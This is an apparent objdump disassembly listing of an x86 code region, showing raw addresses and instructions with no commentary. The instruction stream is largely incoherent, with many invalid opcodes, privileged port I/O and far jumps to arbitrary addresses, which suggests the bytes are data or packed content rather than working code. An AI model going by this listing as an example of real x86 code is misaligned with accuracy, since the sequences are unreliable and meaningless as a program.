  401860:	call   0x4c08:0xec45a121
  401867:	pushf  
  401868:	pusha  
  401869:	and    BYTE PTR ds:0xc25970c8,ah
  40186f:	cld    
  401870:	jb     0x401830
  401872:	ins    BYTE PTR es:[edi],dx
  401873:	das    
  401874:	sbb    al,0x41
  401876:	lahf   
  401877:	repnz xor al,0x77
  40187a:	jnp    0x401860
  40187c:	inc    edx
  40187d:	mov    bl,BYTE PTR [edx+0x5d]
  401880:	cwde   
  401881:	xchg   esi,eax
  401882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401883:	fld    QWORD PTR [ecx]
  401885:	push   edi
  401886:	pop    eax
  401887:	neg    BYTE PTR [eax]
  401889:	imul   edi,DWORD PTR [ecx],0x22
  40188c:	in     eax,0x6
  40188e:	nop
  40188f:	add    edx,DWORD PTR [eax]
  401891:	mov    ch,0x18
  401893:	leave  
  401894:	out    0xcc,al
  401896:	pop    DWORD PTR [edx+ecx*4-0x4a9cd3a4]
  40189d:	xchg   esi,eax
  40189e:	cwde   
  40189f:	das    
  4018a0:	int    0x34
  4018a2:	fldl2t 
  4018a4:	mov    edi,0xb69dfc2c
  4018a9:	rol    BYTE PTR [ebp+0x2c],1
  4018ac:	or     eax,0x391bb1ef
  4018b1:	push   ebp
  4018b2:	dec    esi
  4018b3:	xor    eax,edi
  4018b5:	push   edx
  4018b6:	add    BYTE PTR [edx+0x64],bh
  4018b9:	mov    al,ch
  4018bb:	mov    cl,0x58
  4018bd:	ins    BYTE PTR es:[edi],dx
  4018be:	(bad)  
  4018c0:	sub    cl,BYTE PTR gs:[edx+edx*8-0x80]
  4018c5:	mov    eax,ds:0xe8a6cca7
  4018ca:	sti    
  4018cb:	xchg   esp,eax
  4018cc:	enter  0x914f,0x21
  4018d0:	dec    eax
  4018d1:	dec    esp
  4018d2:	popa   
  4018d3:	adc    esi,DWORD PTR [ebx-0x6a]
  4018d6:	pop    eax
  4018d7:	pop    esi
  4018d8:	jmp    0xa972c938
  4018dd:	xchg   edi,eax
  4018de:	repnz sahf 
  4018e0:	xchg   edi,eax
  4018e2:	xor    ebp,DWORD PTR [esi]
  4018e4:	outs   dx,DWORD PTR ds:[esi]
  4018e5:	pop    eax
  4018e6:	in     eax,dx
  4018e7:	into   
  4018e8:	nop
  4018e9:	mov    DWORD PTR [ebx-0x6b8d4f34],eax
  4018ef:	pop    ds
  4018f0:	leave  
  4018f1:	out    dx,eax
  4018f2:	push   esi
  4018f3:	or     DWORD PTR [edx-0x2873abdc],esp
  4018f9:	and    eax,0xcfabb9a
  4018fe:	dec    esi
  4018ff:	inc    edi
  401900:	aaa    
  401901:	mov    cl,0xd1
  401903:	inc    edx
  401904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401905:	adc    BYTE PTR [eax+0x7d0bf6a],bl
  40190b:	test   DWORD PTR [edx],esi
  40190d:	loopne 0x4018d0
  40190f:	mov    edx,0xe392ba2f
  401914:	js     0x4018bd
  401916:	xor    ecx,DWORD PTR [edx]
  401918:	daa    
  401919:	mov    bh,0x4e
  40191b:	not    DWORD PTR [edi]
  40191d:	pop    ds
  40191e:	pop    edx
  40191f:	inc    edx
  401920:	mov    edi,0xa27ddcfb
  401925:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401926:	imul   ecx,eax,0x6a6f518c
  40192c:	jbe    0x40190d
  40192e:	nop
  40192f:	mov    edx,0x675011b9
  401934:	and    dh,BYTE PTR [esi+0x67]
  401937:	mov    ebp,0xca375539
  40193c:	dec    ebp
  40193d:	loopne 0x4019ac
  40193f:	xchg   BYTE PTR [ebx],ah
  401941:	sbb    eax,0xae4f2acc
  401946:	test   BYTE PTR [ecx+0x6f],cl
  401949:	jb     0x4019ca
  40194b:	sub    al,0x74
  40194d:	jno    0x401962
  40194f:	jo     0x40196f
  401951:	into   
  401952:	mov    bh,0x73
  401954:	sub    al,0x8c
  401956:	xor    DWORD PTR es:[esi-0x5487d19c],esi
  40195d:	sub    DWORD PTR [esi],0xffffffe7
  401960:	inc    edi
  401961:	push   esi
  401962:	fwait
  401963:	cmp    dh,BYTE PTR [ebx+eax*8]
  401966:	dec    esp
  401967:	in     eax,0x48
  401969:	das    
  40196a:	in     al,0x42
  40196c:	cmp    al,0xa0
  40196e:	(bad)  
  401970:	loope  0x4018f3
  401972:	(bad)  
  401973:	into   
  401974:	test   ebx,ebp
  401976:	mov    ebp,0xab948ad4
  40197b:	hlt    
  40197c:	scas   al,BYTE PTR es:[edi]
  40197d:	dec    edx
  40197e:	sub    esi,0xffffffda
  401981:	pop    ds
  401982:	jg     0x4019d9
  401984:	pusha  
  401985:	sar    DWORD PTR [ebp+0x551a4a3b],1
  40198b:	sbb    eax,0xbc4e0646
  401990:	pushf  
  401991:	aaa    
  401992:	sti    
  401993:	sahf   
  401994:	sbb    esi,DWORD PTR ds:0xb766742
  40199a:	push   esp
  40199b:	test   eax,0x27477a8d
  4019a0:	xchg   ecx,eax
  4019a1:	push   0xfffffffe
  4019a3:	icebp  
  4019a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019a5:	ret    0xc756
  4019a8:	daa    
  4019a9:	sub    eax,edx
  4019ab:	push   0x4cc2b6a4
  4019b0:	les    edi,FWORD PTR [eax]
  4019b2:	pop    es
  4019b3:	xchg   esi,eax
  4019b4:	mov    bl,0xd
  4019b6:	stos   BYTE PTR es:[edi],al
  4019b7:	push   ss
  4019b8:	adc    BYTE PTR [ecx+0x4638c52],dh
  4019be:	les    esp,FWORD PTR [edi-0x6f9bf571]
  4019c4:	repnz push ss
  4019c6:	(bad)  
  4019c7:	xor    BYTE PTR [ebx],bl
  4019c9:	push   edx
  4019ca:	xor    edi,esi
  4019cc:	pusha  
  4019cd:	jae    0x40196e
  4019cf:	dec    dx
  4019d1:	outs   dx,BYTE PTR ds:[esi]
  4019d2:	retf   
  4019d3:	iret   
  4019d4:	cli    
  4019d5:	xor    BYTE PTR [ebx-0x4c],0xf
  4019d9:	adc    esp,DWORD PTR ds:0xd64ec3af
  4019df:	and    eax,0xb4a9849c
  4019e4:	icebp  
  4019e5:	xchg   esp,eax
  4019e6:	and    esp,DWORD PTR [ebx]
  4019e8:	fiadd  DWORD PTR [edx-0x5edf4001]
  4019ee:	scas   al,BYTE PTR es:[di]
  4019f0:	in     eax,dx
  4019f1:	mov    bh,ch
  4019f3:	adc    esi,DWORD PTR [ecx-0x47]
  4019f6:	sbb    al,BYTE PTR [edx-0x62e6ad9]
  4019fc:	jo     0x401a40
  4019fe:	std    
  4019ff:	dec    eax
  401a00:	mov    ds:0x601d2b9e,al
  401a05:	hlt    
  401a06:	inc    edx
  401a07:	test   DWORD PTR [ebp+0x45a9cb4e],esp
  401a0d:	clc    
  401a0e:	cmc    
  401a0f:	mov    esi,0xf4e0cf51
  401a14:	cmp    eax,0x459bd764
  401a19:	dec    ecx
  401a1a:	das    
  401a1b:	push   es
  401a1c:	pop    ds
  401a1d:	or     esi,eax
  401a1f:	retf   
  401a20:	imul   edx,DWORD PTR [ecx+0x64ea71ed],0xfecc7c06
  401a2a:	jbe    0x401aa3
  401a2c:	push   0x3
  401a2e:	jecxz  0x401a79
  401a30:	add    eax,0x799c6e32
  401a35:	add    BYTE PTR [esi],0xcb
  401a38:	leave  
  401a39:	sbb    edx,DWORD PTR [edx]
  401a3b:	lods   al,BYTE PTR ds:[esi]
  401a3c:	cld    
  401a3d:	in     al,dx
  401a3e:	cmp    al,0x51
  401a40:	scas   al,BYTE PTR es:[edi]
  401a41:	pop    edi
  401a42:	and    esi,DWORD PTR [edi-0x586d9127]
  401a48:	cmc    
  401a49:	cmp    eax,0x6593a10e
  401a4e:	and    DWORD PTR [esi],ebx
  401a50:	inc    ecx
  401a51:	das    
  401a52:	push   es
  401a53:	jnp    0x401a3a
  401a55:	into   
  401a56:	lods   al,BYTE PTR ds:[esi]
  401a57:	mov    ebx,0x9827f630
  401a5c:	sbb    al,0x5c
  401a5e:	xor    eax,0xa0171591
  401a63:	xchg   DWORD PTR [edi-0x78f79494],ebx
  401a69:	mov    al,ds:0xf7e1eab8
  401a6e:	sub    dh,dh
  401a70:	jmp    0x401a2e
  401a72:	(bad)  
  401a74:	xchg   BYTE PTR [edx+0x450ef22],ah
  401a7a:	xlat   BYTE PTR ds:[ebx]
  401a7b:	out    0x2a,eax
  401a7d:	or     DWORD PTR [ebx-0x3a],esp
  401a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a81:	in     eax,dx
  401a82:	(bad)  
  401a83:	je     0x401ab7
  401a85:	inc    DWORD PTR [esp+edx*1]
  401a88:	dec    ecx
  401a89:	xor    bh,BYTE PTR [eax+0x57]
  401a8c:	pushf  
  401a8d:	sub    ch,ah
  401a8f:	or     bh,BYTE PTR [esp+esi*4]
  401a92:	fwait
  401a93:	popa   
  401a94:	ret    
  401a95:	or     DWORD PTR [esi+ebp*1],esi
  401a98:	addr16 gs retf 0x6c16
  401a9d:	test   DWORD PTR [edi],ecx
  401a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401aa0:	call   0x29b8:0xa22b7032
  401aa7:	icebp  
  401aa8:	and    BYTE PTR [eax],al
  401aaa:	push   eax
  401aab:	out    0x8d,eax
  401aad:	cmp    esp,DWORD PTR [ebp+0x390e83bb]
  401ab3:	cmp    esi,esi
  401ab5:	pop    edi
  401ab6:	arpl   WORD PTR [ebx],bx
  401ab8:	int3   
  401ab9:	fwait
  401aba:	es gs cli 
  401abd:	jbe    0x401b34
  401abf:	pop    eax
  401ac0:	das    
  401ac1:	iret   
  401ac2:	sub    DWORD PTR [ebx],0xfffffffe
  401ac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ac6:	das    
  401ac7:	in     al,0xbc
  401ac9:	jmp    0xa5090b51
  401ace:	leave  
  401acf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ad0:	sbb    ebp,DWORD PTR [edx-0x43]
  401ad3:	mov    dh,0xad
  401ad5:	add    eax,0xb487f67c
  401ada:	rol    DWORD PTR [eax],0x13
  401add:	(bad)  [edx]
  401adf:	sub    DWORD PTR [esp+esi*4-0x1f29f277],eax
  401ae6:	call   0x3113:0xd50c6480
  401aed:	int3   
  401aee:	hlt    
  401aef:	xlat   BYTE PTR ds:[ebx]
  401af0:	test   eax,0xca2ea857
  401af5:	pushf  
  401af6:	push   ebp
  401af7:	cmp    ebp,DWORD PTR [esi+esi*2-0x44]
  401afb:	stos   DWORD PTR es:[edi],eax
  401afc:	shl    DWORD PTR [ebx],0x27
  401aff:	mov    edi,0x6bc07e5e
  401b04:	add    eax,0x1d3d2d7d
  401b09:	push   cs
  401b0a:	repnz inc eax
  401b0c:	mov    dl,0xb5
  401b0e:	or     BYTE PTR [edi+0x4e51b558],al
  401b14:	mov    eax,ds:0x101527b3
  401b19:	cmp    al,0xae
  401b1b:	push   ds
  401b1c:	push   eax
  401b1d:	leave  
  401b1e:	mov    ebx,0x5ee9cdc6
  401b23:	fmulp  st(2),st
  401b25:	aam    0xfa
  401b27:	xchg   ebp,eax
  401b28:	fild   QWORD PTR [ecx+0x7b]
  401b2b:	das    
  401b2c:	push   ecx
  401b2d:	shl    DWORD PTR [esp+esi*4+0x37db68b8],cl
  401b34:	mov    al,ds:0x853e5bc6
  401b39:	cld    
  401b3a:	pop    ebx
  401b3b:	xor    al,0x5
  401b3d:	pop    edi
  401b3e:	sbb    dh,bh
  401b40:	or     BYTE PTR [eax+eiz*2],dl
  401b43:	fs inc edx
  401b45:	sbb    ch,BYTE PTR [ebx+0x29d09265]
  401b4b:	or     ah,al
  401b4d:	jl     0x401b78
  401b4f:	es pop edx
  401b51:	xor    BYTE PTR [edx-0x7a],al
  401b54:	pop    ebp
  401b55:	les    eax,FWORD PTR [eax+0x1a2f06bb]
  401b5b:	outs   dx,BYTE PTR ds:[esi]
  401b5c:	retf   
  401b5d:	jg     0x401aef
  401b5f:	push   ds
  401b60:	xchg   edx,eax
  401b61:	dec    edx
  401b62:	cmp    esp,ecx
  401b64:	mov    edi,0xa55ac87c
  401b69:	xchg   DWORD PTR [edi+0x5e],eax
  401b6c:	dec    edi
  401b6d:	pop    edx
  401b6e:	mov    cl,0x9f
  401b70:	push   ecx
  401b71:	sbb    dl,BYTE PTR [ebx+0x5a]
  401b74:	dec    esp
  401b75:	pop    edx
  401b76:	add    ecx,DWORD PTR [ebp-0x53dcc4dc]
  401b7c:	lds    eax,FWORD PTR [ecx+0x0]
  401b7f:	jg     0x401b64
  401b81:	mov    ebx,0x67520b5e
  401b86:	cmc    
  401b87:	or     eax,0x4fa4c0e7
  401b8c:	pop    ss
  401b8d:	inc    ebx
  401b8e:	shl    BYTE PTR [ebp-0x153ca6b3],cl
  401b94:	or     ecx,DWORD PTR [esi*8-0x7505d876]
  401b9b:	inc    ebp
  401b9c:	pop    DWORD PTR [ecx+ebx*4+0x54]
  401ba0:	ss sbb bl,dh
  401ba3:	fisub  DWORD PTR [edi-0xd52fb6]
  401ba9:	jle    0x401b88
  401bab:	pop    ds
  401bac:	adc    al,ch
  401bae:	jae    0x401b7e
  401bb0:	or     DWORD PTR ds:0x4cd0a0f5,ebx
  401bb6:	test   al,0x67
  401bb8:	lds    ecx,FWORD PTR [ecx]
  401bba:	aam    0xc6
  401bbc:	sti    
  401bbd:	inc    edx
  401bbe:	push   cs
  401bbf:	push   ss
  401bc0:	(bad)  
  401bc1:	mov    al,0x21
  401bc3:	push   esi
  401bc4:	cmp    ebp,DWORD PTR [ebx]
  401bc6:	jg     0x401be8
  401bc8:	jle    0x401c48
  401bca:	dec    eax
  401bcb:	int3   
  401bcc:	aad    0xac
  401bce:	repnz cmp DWORD PTR [edx],esi
  401bd1:	outs   dx,BYTE PTR ds:[esi]
  401bd2:	inc    ebx
  401bd3:	(bad)  
  401bd4:	pop    ecx
  401bd5:	leave  
  401bd6:	ins    DWORD PTR es:[edi],dx
  401bd7:	inc    eax
  401bd8:	mov    esi,0x49b91d4a
  401bdd:	jns    0x401b64
  401bdf:	pop    ebp
  401be0:	push   ecx
  401be1:	adc    BYTE PTR [esi+eiz*8],dl
  401be4:	lock sbb BYTE PTR [edx-0x21],0x51
  401be9:	cwde   
  401bea:	in     al,0xea
  401bec:	(bad)  
  401bed:	in     al,dx
  401bee:	jl     0x401c08
  401bf0:	frstor [ebx]
  401bf2:	mov    edx,0x1cca5e0e
  401bf7:	out    dx,eax
  401bf8:	pop    edi
  401bf9:	sbb    al,BYTE PTR [ebp+0x10]
  401bfc:	rcl    BYTE PTR [ecx],cl
  401bfe:	(bad)  
  401bff:	xor    al,0x77
  401c01:	jecxz  0x401c4c
  401c03:	pop    edx
  401c04:	push   0x7966665a
  401c09:	jno    0x401bae
  401c0b:	ret    0xa79
  401c0e:	inc    ebx
  401c0f:	imul   esi,DWORD PTR [eiz*1-0x1341c2bc],0x6
  401c17:	and    DWORD PTR [ebx],esp
  401c19:	add    ch,bl
  401c1b:	cmp    ebx,DWORD PTR [ecx+0x32]
  401c1e:	shl    BYTE PTR [esi+ecx*4-0x44eddf2f],cl
  401c25:	repnz enter 0x686c,0xc4
  401c2a:	pop    ecx
  401c2b:	aam    0x7e
  401c2d:	imul   eax,DWORD PTR [ebx-0x71],0x23fd18e2
  401c34:	aad    0xc1
  401c36:	inc    eax
  401c37:	add    edi,DWORD PTR [ecx-0x77d65034]
  401c3d:	leave  
  401c3e:	inc    edx
  401c3f:	jecxz  0x401caf
  401c41:	int3   
  401c42:	mov    esi,ds
  401c44:	and    eax,edi
  401c46:	jo     0x401cc7
  401c48:	repz shl BYTE PTR [eax+0x55aa79c],1
  401c4f:	jge    0x401c94
  401c51:	sbb    dh,BYTE PTR cs:[esi]
  401c54:	pop    eax
  401c55:	(bad)  
  401c56:	mov    al,ds:0x7199523b
  401c5b:	inc    edi
  401c5c:	push   esp
  401c5d:	xchg   edi,eax
  401c5e:	or     ch,BYTE PTR [edi-0x17]
  401c61:	pop    edx
  401c62:	sahf   
  401c63:	call   0xc42:0x882c5cb8
  401c6a:	scas   eax,DWORD PTR es:[edi]
  401c6b:	jns    0x401ce9
  401c6d:	out    dx,eax
  401c6e:	add    DWORD PTR [ecx],ebx
  401c70:	mov    dl,0x53
  401c72:	mov    ch,0x17
  401c74:	and    al,0x5c
  401c76:	adc    ecx,DWORD PTR ds:0x476dd539
  401c7c:	mov    bh,0x56
  401c7e:	push   eax
  401c7f:	(bad)  
  401c80:	call   FWORD PTR [eax+0x1c506cde]
  401c86:	pop    edi
  401c87:	jo     0x401cf9
  401c89:	hlt    
  401c8a:	outs   dx,DWORD PTR ds:[esi]
  401c8b:	mov    esp,0x4e82133f
  401c90:	ja     0x401c18
  401c92:	ss pushf 
  401c94:	push   DWORD PTR [esi]
  401c96:	xchg   ebx,eax
  401c97:	push   esp
  401c98:	inc    ebx
  401c99:	push   ecx
  401c9a:	and    esi,esi
  401c9c:	fbld   TBYTE PTR [esp+ecx*1-0x5f]
  401ca0:	jbe    0x401cbe
  401ca2:	mov    es,WORD PTR [ecx+0x38]
  401ca5:	repz or eax,0x8203ba10
  401cab:	mov    esi,0xf24a77d3
  401cb0:	mov    ss,WORD PTR [edx-0x2d]
  401cb3:	mov    al,BYTE PTR ds:0x458c1344
  401cb9:	mov    ebx,0x8f589d69
  401cbe:	and    edx,edi
  401cc0:	add    BYTE PTR [edi],dl
  401cc2:	cmp    al,0xa3
  401cc4:	xor    al,0xe7
  401cc6:	mov    al,0x31
  401cc8:	xor    DWORD PTR [ebx+ebp*1-0x6023d294],ebp
  401ccf:	inc    ebx
  401cd0:	je     0x401cf9
  401cd2:	sbb    eax,0xd258adc2
  401cd7:	jbe    0x401c80
  401cd9:	jno    0x401d04
  401cdb:	jnp    0x401d21
  401cdd:	mov    ecx,0x9cf5a4dd
  401ce2:	stc    
  401ce3:	fwait
  401ce4:	ins    BYTE PTR es:[edi],dx
  401ce5:	pop    ebx
  401ce6:	fwait
  401ce7:	mov    ebx,0xe0a39ef9
  401cec:	dec    eax
  401ced:	repz ret 
  401cef:	pushf  
  401cf0:	pop    edi
  401cf1:	xchg   DWORD PTR [ecx],esi
  401cf3:	(bad)  [eax+0x41]
  401cf6:	gs ss ret 
  401cf9:	call   0x677df385
  401cfe:	push   0xb4c940ba
  401d03:	es cmp al,0xc
  401d06:	repz push edi
  401d08:	mov    bl,0x3f
  401d0a:	xchg   edx,eax
  401d0b:	push   cs
  401d0c:	(bad)  
  401d0d:	jp     0x401cd8
  401d0f:	xchg   ebx,eax
  401d10:	mov    cl,0xec
  401d12:	xlat   BYTE PTR ds:[ebx]
  401d13:	lods   eax,DWORD PTR ds:[esi]
  401d14:	je     0x401ced
  401d16:	fistp  DWORD PTR [ebx+0x28]
  401d19:	mov    dl,0x56
  401d1b:	jo     0x401d56
  401d1d:	sar    ebp,0xd5
  401d20:	imul   eax,ecx,0xffffffc6
  401d23:	neg    DWORD PTR [ebp-0x63]
  401d26:	and    ebx,DWORD PTR [ecx+0x4]
  401d29:	enter  0x7765,0x21
  401d2d:	push   esi
  401d2e:	or     al,0x6a
  401d30:	ja     0x401ce3
  401d32:	dec    ebx
  401d33:	xor    eax,0x239fa324
  401d38:	sub    al,0x50
  401d3a:	fcomp  DWORD PTR [ebx+0x27c43b49]
  401d40:	inc    ebp
  401d41:	mov    bl,0x16
  401d43:	cmp    eax,0x8e33547b
  401d48:	rcl    dl,1
  401d4a:	adc    al,0x36
  401d4c:	retf   0xeadd
  401d4f:	leave  
  401d50:	dec    ecx
  401d51:	and    eax,0xffffff8a
  401d54:	aas    
  401d55:	dec    eax
  401d56:	push   ecx
  401d57:	rcr    BYTE PTR [eax],0xd9
  401d5a:	pop    edx
  401d5b:	in     eax,0xa6
  401d5d:	mov    ch,0xd9
  401d5f:	sbb    al,0xf3
  401d61:	or     BYTE PTR [ecx+0x10c1133e],0xb
  401d68:	cld    
  401d69:	mov    esp,0x17d288d7
  401d6e:	or     ah,BYTE PTR [ecx-0xd]
  401d71:	push   es
  401d72:	in     eax,0x0
  401d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d75:	sbb    bh,BYTE PTR [edi+esi*8]
  401d78:	enter  0x6dd2,0xab
  401d7c:	frstor [eax+eiz*1+0x19]
  401d80:	and    BYTE PTR [ecx-0x7d],ch
  401d83:	ja     0x401d4a
  401d85:	jg     0x401de2
  401d87:	mov    cs,WORD PTR [esi-0x1e]
  401d8a:	or     al,0x6
  401d8c:	xor    BYTE PTR [edx-0x42],ch
  401d8f:	fcom   DWORD PTR [esi+0x52]
  401d92:	adc    DWORD PTR [esi],edx
  401d94:	aad    0xd8
  401d96:	fistp  DWORD PTR [esi]
  401d98:	adc    edi,edx
  401d9a:	fiadd  WORD PTR [ecx-0x42d415bc]
  401da0:	xchg   edx,eax
  401da1:	push   ds
  401da2:	or     dh,dh
  401da4:	scas   eax,DWORD PTR es:[edi]
  401da5:	mov    BYTE PTR [ebx],cl
  401da7:	inc    edi
  401da8:	inc    esi
  401da9:	xchg   BYTE PTR [esi],bl
  401dab:	fst    QWORD PTR [ebx+0x17a15ebb]
  401db1:	xchg   BYTE PTR [ebp+0x73],ah
  401db4:	jmp    DWORD PTR [eax+eiz*2-0x76]
  401db8:	div    DWORD PTR [eax+eax*1]
  401dbb:	(bad)  
  401dbc:	stc    
  401dbd:	jp     0x401de9
  401dbf:	mov    DWORD PTR [ecx+0x19d37f70],ecx
  401dc5:	sub    cl,BYTE PTR [ebp+0x38]
  401dc8:	stos   BYTE PTR es:[edi],al
  401dc9:	mov    ?,WORD PTR [edx+0x5d7dbf44]
  401dcf:	mov    cl,0xe8
  401dd1:	retf   
  401dd2:	xor    al,0xef
  401dd4:	or     dh,BYTE PTR [esi-0x7055e379]
  401dda:	xlat   BYTE PTR ds:[ebx]
  401ddb:	jg     0x401db0
  401ddd:	out    0xec,al
  401ddf:	test   bh,0xc3
  401de2:	xchg   esp,ebp
  401de4:	pop    esp
  401de5:	jmp    0x87a3977c
  401dea:	int3   
  401deb:	mov    ?,WORD PTR [eiz*1-0x1d52a7b9]
  401df2:	xchg   edi,eax
  401df3:	icebp  
  401df4:	int    0x5d
  401df6:	rcr    DWORD PTR [ebx+0x3029fac7],1
  401dfc:	mov    ebp,0x54061c21
  401e01:	adc    DWORD PTR [edx],0xf965bb52
  401e07:	scas   al,BYTE PTR es:[edi]
  401e08:	sub    al,0x47
  401e0a:	(bad)  
  401e0b:	adc    BYTE PTR [esi+0x14],bh
  401e0e:	adc    BYTE PTR [edx-0x4bed1798],dh
  401e14:	jb     0x401db5
  401e16:	add    esi,DWORD PTR [esi]
  401e18:	inc    ecx
  401e19:	push   edx
  401e1a:	mov    eax,0x8e624979
  401e1f:	js     0x401dec
  401e21:	in     eax,dx
  401e22:	ja     0x401dfc
  401e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e25:	gs xor eax,0x2cdf310f
  401e2b:	jmp    0xbc9a21bb
  401e30:	mov    ds:0x101d177a,eax
  401e35:	sub    dh,BYTE PTR [eax-0x560088d7]
  401e3b:	js     0x401ea1
  401e3d:	mov    dl,0x39
  401e3f:	and    cl,0x82
  401e42:	push   ebp
  401e43:	test   al,0x7
  401e45:	out    dx,al
  401e46:	(bad)  
  401e47:	and    al,0x52
  401e49:	and    BYTE PTR [ebp+0x30],al
  401e4c:	mov    cl,0x3e
  401e4e:	mov    esp,0x6d36b017
  401e53:	mov    eax,ds:0xd3b83002
  401e58:	mov    eax,ds:0xd23f7a4
  401e5d:	push   cs
  401e5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e5f:	mov    BYTE PTR [ebp+0x67],ah
  401e62:	scas   al,BYTE PTR es:[edi]
  401e63:	loope  0x401ee4
  401e65:	int    0x4f
  401e67:	xchg   ebp,eax
  401e68:	mov    ebp,0x533fddfe
  401e6d:	retf   0x1165
  401e70:	ret    
  401e71:	inc    esi
  401e72:	fbld   TBYTE PTR [edx+edx*1+0xa]
  401e76:	inc    edx
  401e77:	mov    ds:0x534b51ae,eax
  401e7c:	jle    0x401e0f
  401e7e:	ja     0x401ea7
  401e80:	daa    
  401e81:	inc    edi
  401e82:	sbb    ebp,eax
  401e84:	pop    ebx
  401e85:	jp     0x401e1e
  401e87:	sahf   
  401e88:	and    BYTE PTR [ecx-0x59],dl
  401e8b:	or     ecx,DWORD PTR [ebx+0x4a3b3e13]
  401e91:	mov    eax,0x7444ad89
  401e96:	aaa    
  401e97:	pop    edx
  401e98:	mov    ss,WORD PTR [edi+0x2f77f09b]
  401e9e:	mov    eax,ds:0xf4eaf93e
  401ea3:	ins    DWORD PTR es:[edi],dx
  401ea4:	xor    al,0xb9
  401ea6:	dec    ebp
  401ea7:	add    esp,DWORD PTR [ebp-0x67d95c04]
  401ead:	(bad)  
  401eae:	je     0x401f0d
  401eb0:	mov    esi,0xbca4faea
  401eb5:	jbe    0x401f08
  401eb7:	inc    eax
  401eb8:	les    eax,FWORD PTR [ebx+0x2f920aa4]
  401ebe:	or     ah,BYTE PTR [ebp-0x32]
  401ec1:	jne    0x401f41
  401ec3:	inc    esp
  401ec4:	add    BYTE PTR [esi],bh
  401ec6:	push   es
  401ec7:	ins    BYTE PTR es:[edi],dx
  401ec8:	rcl    DWORD PTR [eax-0x8],0x2d
  401ecc:	shl    BYTE PTR [edx-0x4d],0xb9
  401ed0:	stos   DWORD PTR es:[edi],eax
  401ed1:	pop    ss
  401ed2:	stc    
  401ed3:	stos   BYTE PTR es:[edi],al
  401ed4:	push   ss
  401ed5:	jecxz  0x401ee1
  401ed7:	hlt    
  401ed8:	adc    DWORD PTR [ebx+edx*1-0x5dab184e],0xd8661f72
  401ee3:	stos   BYTE PTR es:[edi],al
  401ee4:	add    DWORD PTR [edx-0x3a],0xf0f46011
  401eeb:	push   esi
  401eec:	nop
  401eed:	fimul  WORD PTR ds:[eax]
  401ef0:	je     0x401ede
  401ef2:	cmc    
  401ef3:	xor    ch,BYTE PTR [edi+0x14]
  401ef6:	(bad)  [ecx]
  401ef8:	and    ebp,DWORD PTR [ecx-0x9]
  401efb:	pushf  
  401efc:	mov    eax,ds:0x2e2162f3
  401f01:	push   es
  401f02:	jns    0x401e8f
  401f04:	push   ebp
  401f05:	xchg   ebx,eax
  401f06:	scas   eax,DWORD PTR es:[edi]
  401f07:	xchg   ecx,eax
  401f08:	mov    edi,0xaa64de65
  401f0d:	cmp    al,0xe6
  401f0f:	mov    al,ds:0xd8422b9b
  401f14:	les    esi,FWORD PTR [esi]
  401f16:	jp     0x401ef3
  401f18:	aaa    
  401f19:	mov    ds:0xf3449e2e,al
  401f1e:	pop    esp
  401f1f:	int3   
  401f20:	inc    edi
  401f21:	jns    0x401ed1
  401f23:	in     eax,0x7b
  401f25:	in     eax,dx
  401f26:	jno    0x401f1a
  401f28:	dec    ebp
  401f29:	mov    esp,0x504045ff
  401f2e:	add    DWORD PTR [ecx+0x66],edx
  401f31:	out    0xa5,eax
  401f33:	popf   
  401f34:	cli    
  401f35:	in     al,0x44
  401f37:	cmp    cl,ah
  401f39:	(bad)
  401f3d:	dec    ebx
  401f3e:	xchg   ecx,eax
  401f3f:	push   cs
  401f40:	add    ecx,ebp
  401f42:	aas    
  401f43:	and    ebp,DWORD PTR [edi+edx*8]
  401f46:	jns    0x401f0d
  401f48:	fdiv   QWORD PTR [ebx-0x5d]
  401f4b:	cld    
  401f4c:	ds into 
  401f4e:	jae    0x401f83
  401f50:	push   eax
  401f51:	clc    
  401f52:	call   0x61c50e6c
  401f57:	or     al,0x59
  401f59:	xchg   BYTE PTR [ebx-0x8947d6e],al
  401f5f:	dec    ebx
  401f60:	sbb    ch,bh
  401f62:	adc    al,0x4e
  401f64:	pop    esp
  401f65:	cmp    dh,cl
  401f67:	(bad)  
  401f69:	outs   dx,DWORD PTR ds:[esi]
  401f6a:	jne    0x401fe3
  401f6c:	rcr    ebx,cl
  401f6e:	mov    bl,0xdb
  401f70:	add    DWORD PTR [esi+0x23],ecx
  401f73:	inc    eax
  401f74:	clc    
  401f75:	(bad)  
  401f76:	xchg   ecx,eax
  401f77:	sbb    al,0xe3
  401f79:	cmp    edx,DWORD PTR [ebx+0x74]
  401f7c:	rol    DWORD PTR [ebx-0x604e58cb],1
  401f82:	pop    esi
  401f83:	int3   
  401f84:	xor    al,0xe1
  401f86:	jbe    0x401faf
  401f88:	and    BYTE PTR [ebx-0x2c026066],bl
  401f8e:	xchg   esi,eax
  401f8f:	cmc    
  401f90:	ins    BYTE PTR es:[edi],dx
  401f91:	popa   
  401f92:	cmc    
  401f93:	cmc    
  401f94:	ja     0x401f21
  401f96:	ins    DWORD PTR es:[edi],dx
  401f97:	cwde   
  401f98:	adc    DWORD PTR [esi+0x7835abdd],ebp
  401f9e:	ror    ecx,0xc0
  401fa1:	pop    eax
  401fa2:	inc    esp
  401fa3:	mov    edi,0x4efff9fe
  401fa8:	pusha  
  401fa9:	pop    eax
  401faa:	fwait
  401fab:	ins    DWORD PTR es:[edi],dx
  401fac:	add    DWORD PTR [eax+ebx*8],ebx
  401faf:	dec    edi
  401fb0:	fistp  WORD PTR [edx-0x47]
  401fb3:	ins    DWORD PTR es:[edi],dx
  401fb4:	jno    0x401f3d
  401fb6:	jecxz  0x402020
  401fb8:	loope  0x401fcb
  401fba:	adc    cl,ah
  401fbc:	imul   esp,ecx,0xffffffe9
  401fbf:	cld    
  401fc0:	in     al,dx
  401fc1:	sub    edi,ecx
  401fc3:	dec    ebx
  401fc4:	retf   
  401fc5:	cmp    eax,0x94926b41
  401fca:	(bad)  
  401fcb:	(bad)  [esp+esi*4]
  401fce:	mov    ch,0x9a
  401fd0:	inc    ebp
